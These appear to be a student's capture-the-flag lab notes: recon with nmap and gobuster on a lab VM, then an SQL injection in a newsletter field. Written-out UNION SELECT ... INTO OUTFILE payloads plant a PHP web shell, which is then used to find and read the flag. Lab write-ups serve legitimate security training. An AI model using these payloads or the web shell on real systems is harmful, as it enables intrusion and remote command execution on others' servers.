5. **Capstone Lab**: Enumerate the Module Exercise - VM #2 and exploit the SQLi vulnerability to get the flag.

```bash
# IP: 192.168.199.48

# Reconnaissance
sudo nmap -sV -sC -v 192.168.199.48
	# Linux host
	# 22: SSH
	# 80: HTTP
	# 3306: MySQL

# Manual reconnaissance of the website
	# lab@forestsave.lab
	# "Free HTML Templates" -- html.design
	# Uses PHP
	# Google Maps API key is open in plaintext
	# nginx/1.14.2 -- dead-end
	# Leostop.com
	# Newsletter field

# Directory reconnaissance
gobuster dir -u 192.168.199.48 -w /usr/share/wordlists/dirb/common.txt

# Subdomain
gobuster vhost --useragent "PENTEST" --wordlist "/usr/share/wordlists/dirb/common.txt" --url http://forestsave.lab/ --append-domain
gobuster dns -d forestsave.lab -w /usr/share/wordlists/dirb/common.txt -t 10
	# Dead end
	
# Found an SQL injection in the "newsletter" field
# Trying to upload a webshell
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //                     '
	# Error on the amount of columns.

# Finding the right amount...
mail-list=' ORDER BY 6-- //           ': Works
mail-list=' ORDER BY 7-- //           ': Breaks
	# 6 columns total

# Adding one more column to the previous command: 6 total
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //                     '
	# Can't create file + file not accessible
	# Maybe due to the fact that /tmp doesn't exist

# Trying at the root
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null, null INTO OUTFILE "/var/www/html/webshell.php" -- //                     '
	# No error on the output!

# Accessing the file
http://192.168.199.48/webshell.php?
	# Works :D

# Finding the flag
http://192.168.199.48/webshell.php?cmd=find / -name "flag.txt" 2>/dev/null

# Printing the flag
http://192.168.199.48/webshell.php?cmd=cat /var/www/flag.txt
```
![[Pasted image 20250315113401.png]]